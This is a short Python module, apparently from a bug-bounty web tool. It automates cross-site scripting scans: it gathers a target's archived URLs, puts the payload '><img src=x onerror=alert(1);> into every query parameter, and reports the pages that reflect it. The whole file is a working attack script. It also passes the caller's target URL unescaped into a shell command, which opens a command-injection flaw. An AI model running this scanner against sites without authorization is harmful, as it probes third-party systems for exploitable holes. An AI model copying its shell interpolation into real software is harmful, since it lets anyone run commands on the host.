import os
import subprocess
from urllib.parse import unquote

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def start(target_url):
    process = subprocess.Popen(
        f"echo {target_url} | {BASE_DIR}/webapp/waybackurls | grep '=' |\
        egrep -iv '.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)' | uro |\
        {BASE_DIR}/webapp/qsreplace '><img src=x onerror=alert(1);>' | {BASE_DIR}/webapp/freq cc:bountyoverflow",
        stdout=subprocess.PIPE,
        shell=True,
    )
    output = []
    yield "#####################\n# Process started...#\n#####################\n\n"
    for line in process.stdout:
        if "Not" not in line.decode("utf-8") and "Vulnerable" in line.decode("utf-8"):
            # if "Vulnerable" in line.decode("utf-8"):
            payload = unquote(
                line.decode("utf-8")
                .replace("\x1b[31m", "")
                .replace("\x1b[0m\n", "")
                .replace("[32m", "")
                .strip()
            )
            output.append(payload)
            yield f"{payload}\n"
            # time.sleep(0.5)

    if not output:
        yield "\n\nThere were no interesting findings, unfortunately..."
    else:
        yield "\n+ There seems to have been an important discovery, let's look into it."
